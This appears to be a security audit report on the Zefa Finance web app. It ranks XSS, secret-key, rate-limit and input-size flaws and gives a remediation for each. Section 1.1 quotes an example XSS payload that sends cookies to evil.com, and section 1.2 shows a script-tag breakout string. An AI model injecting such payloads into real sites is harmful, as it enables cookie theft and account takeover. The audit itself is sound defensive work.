# Security Audit — Fine-Grained Vulnerability Review

**Date:** 2026-02-10  
**Scope:** Backend (FastAPI), Frontend (Next.js/React), Auth, Chat, Storage  
**Status:** Audit report — remediation tasks listed

---

## Executive Summary

This document provides a granular security review of the Zefa Finance application. Several **critical** and **high** severity issues were identified, primarily around XSS in the chat rendering pipeline and missing input/output constraints. Recommendations are prioritized by severity.

---

## 1. Critical Vulnerabilities

### 1.1 XSS via rehype-raw in ChatBubble (CRITICAL)

**Location:** `frontend/components/chat/ChatBubble.tsx`

**Issue:** The component uses `rehypeRaw` (rehype-raw) which allows **raw HTML** to pass through react-markdown without sanitization. Both user messages and AI responses are rendered with this pipeline.

**Attack vectors:**
1. **User message:** A malicious user sends `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">` — when rendered, JavaScript executes, stealing tokens from localStorage.
2. **AI response (prompt injection):** An attacker could prompt the AI to output malicious HTML that executes when rendered.

**Impact:** Full account takeover, token theft, session hijacking, data exfiltration.

**Evidence:** TECHNICAL_DOCUMENTATION states "No raw HTML rendering (security-first approach)" but the code contradicts this by using rehypeRaw.

**Remediation:**
1. **Remove rehypeRaw** — do not parse raw HTML in markdown.
2. For search highlight (`<mark>`), use a different approach:
   - Option A: Use `remark` to wrap matches in a custom node → map to React component (no raw HTML).
   - Option B: Use `rehype-sanitize` with a strict schema allowing only `<mark data-search-highlight="true">` and escaped content.
3. Ensure all user/AI content is treated as untrusted; never render unsanitized HTML.

---

### 1.2 XSS via highlightSearchTerms unescaped injection (CRITICAL)

**Location:** `frontend/lib/markdown/remarkHighlightSearch.ts`

**Issue:** `highlightSearchTerms` injects `substring` into HTML without escaping:
```typescript
return `<mark data-search-highlight="true">${substring}</mark>`
```
If `substring` contains `</mark><script>alert(1)</script>`, the injected string breaks out and executes. Combined with rehypeRaw, this is a direct XSS vector.

**Remediation:**
- Escape HTML entities in `substring` before injection (e.g. `&`, `<`, `>`, `"`, `'`).
- Or remove raw HTML entirely (see 1.1) and use a markdown-safe highlighting approach.

---

### 1.3 SECRET_KEY default in production (CRITICAL)

**Location:** `backend/app/auth_utils.py`

**Issue:**
```python
SECRET_KEY = os.getenv("SECRET_KEY", "dev-secret-key-change-in-production")
```
If deployed without setting `SECRET_KEY`, an attacker who knows the default can forge JWTs and impersonate any user.

**Remediation:**
1. Fail fast on startup if `SECRET_KEY` is the default in non-development environments.
2. In production, require `SECRET_KEY` and reject the default value.
3. Add a startup check: `if os.getenv("ENVIRONMENT") == "production" and SECRET_KEY == "dev-secret-key-change-in-production": raise RuntimeError("SECRET_KEY must be set in production")`

---

## 2. High Severity

### 2.1 No rate limiting (HIGH)

**Locations:** All auth and chat endpoints.

**Issue:** No rate limiting on:
- `POST /token` (login) — brute force password guessing
- `POST /auth/register` — account enumeration, spam accounts
- `POST /chat/messages` — DoS, cost exhaustion (AI calls)
- `POST /auth/refresh` — token brute force

**Remediation:**
1. Add middleware or dependency for rate limiting (e.g. `slowapi`, custom middleware with Redis/in-memory store).
2. Recommended limits (examples):
   - Login: 5 attempts per IP per 15 minutes
   - Register: 3 per IP per hour
   - Chat: 30 messages per user per minute
   - Refresh: 10 per IP per minute

---

### 2.2 Unbounded list transactions limit (HIGH)

**Location:** `backend/app/routers/transactions.py`

**Issue:**
```python
limit: int = 50
# No upper bound — client can pass limit=999999
transactions = await crud.list_user_transactions(db, current_user.id, limit)
```

**Impact:** DoS via excessive DB load and response size.

**Remediation:**
- Add `Query(ge=1, le=500)` or similar to cap `limit` at a reasonable maximum (e.g. 500).

---

### 2.3 Unbounded chat message size (HIGH)

**Location:** `backend/app/chat/schemas.py` — `ChatMessageCreate.text: Optional[str] = None`

**Issue:** No `max_length` on `text`. A client can send a multi-megabyte message, exhausting memory, DB storage, or AI context.

**Remediation:**
- Add `Field(max_length=10000)` or similar to `ChatMessageCreate.text`.
- Reject or truncate oversized messages.

---

### 2.4 API key endpoint stores arbitrary strings (HIGH)

**Location:** `backend/app/chat/routes.py` — `POST /chat/api-key`

**Issue:**
- Accepts any string as `api_key` with no format validation.
- Stored in memory; attackers could exhaust memory with many large keys.
- No authentication/authorization beyond `get_current_user` — any logged-in user can set keys.

**Remediation:**
- Validate API key format (e.g. `sk-...` for OpenAI, length limits).
- Limit number of ephemeral keys per user or IP.
- Consider deprecating or restricting this endpoint in production.

---

## 3. Medium Severity

### 3.1 Error message leaks API key configuration (MEDIUM)

**Location:** `backend/app/chat/routes.py` (ValueError handler)

**Issue:** When API key is missing, the response includes:
```
"Por favor, configure a variável de ambiente OPENAI_API_KEY, ANTHROPIC_API_KEY ou GEMINI_API_KEY no arquivo .env do backend..."
```
This reveals internal configuration details and provider choice to any user.

**Remediation:** Return a generic message: "AI service is not configured. Please contact support."

---

### 3.2 Refresh token in request body (MEDIUM)

**Location:** `backend/app/routers/auth.py` — `TokenRefreshRequest` and refresh flow

**Issue:** Refresh token can be sent in the request body. Body content is more likely to be logged by proxies, load balancers, or debugging tools than HTTP-only cookies.

**Remediation:** Prefer cookie-only refresh; deprecate body-based refresh or restrict it to specific use cases (e.g. mobile) with clear documentation.

---

### 3.3 Transaction fields without max length (MEDIUM)

**Location:** `backend/app/schemas.py` — `TransactionCreate`, `TransactionUpdate`

**Issue:** `category` and `description` have no `max_length`. DB columns are `String(255)` — Pydantic does not enforce this; invalid data may cause DB errors or inconsistent behavior.

**Remediation:** Add `Field(max_length=255)` to match DB schema.

---

### 3.4 Chat conversation isolation (MEDIUM — verified safe)

**Location:** `backend/app/chat/crud.py`

**Issue:** `payload.conversation_id` is passed from the client. The CRUD layer (`list_recent_messages`, `get_conversation_summary`, etc.) always filters by `user_id` from the JWT, so messages from other users cannot be accessed. No data leak occurs. Consider adding an explicit comment that `conversation_id` is a logical grouping key and ownership is enforced via `user_id` in all queries.

---

## 4. Low Severity / Informational

### 4.1 CORS `allow_headers=["*"]` (LOW)

**Location:** `backend/app/main.py` — CORSMiddleware

**Issue:** Permissive headers. Usually acceptable for APIs that don't rely on header allowlists for security, but could be tightened if needed.

**Remediation:** Restrict to needed headers if there is a specific security requirement.

---

### 4.2 `datetime.utcnow()` usage (LOW)

**Location:** Multiple backend files

**Issue:** `datetime.utcnow()` is deprecated in Python 3.12+. Prefer `datetime.now(timezone.utc)` for consistency and future compatibility.

**Remediation:** Replace with `datetime.now(timezone.utc)` across the codebase.

---

### 4.3 Debug logging in chat routes (LOW)

**Location:** `backend/app/chat/routes.py` — `print(f"[DEBUG] Persisting assistant message")`

**Issue:** Debug prints may leak into logs in production.

**Remediation:** Use `logger.debug()` with proper log levels and ensure DEBUG is disabled in production.

---

## 5. Previously Addressed

The following were addressed in a prior security review:
- **Logout cleanup:** All `zefa_*` keys are cleared on logout (`clearAllZefaStorage`).
- **Security headers:** X-Content-Type-Options, X-Frame-Options, Referrer-Policy, CSP, Permissions-Policy configured in Next.js.
- **JWT in localStorage:** Still present; migration to httpOnly cookies is a longer-term improvement.

---

## 6. Remediation Priority

| Priority | ID   | Issue                          | Effort |
|----------|------|--------------------------------|--------|
| P0       | 1.1  | Remove rehypeRaw / fix XSS     | Medium |
| P0       | 1.2  | Escape highlightSearchTerms    | Low    |
| P0       | 1.3  | SECRET_KEY production check    | Low    |
| P1       | 2.1  | Rate limiting                  | Medium |
| P1       | 2.2  | Cap transactions limit         | Low    |
| P1       | 2.3  | Cap chat message size          | Low    |
| P1       | 2.4  | Validate API key format        | Low    |
| P2       | 3.1  | Generic API key error message  | Low    |
| P2       | 3.2  | Prefer cookie-only refresh     | Medium |
| P2       | 3.3  | Add max_length to schemas      | Low    |
| P2       | 3.4  | Add isolation comment (optional) | Low    |

---

## 7. References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [react-markdown + rehype-raw security](https://github.com/remarkjs/remark/blob/main/doc/plugins.md#security)
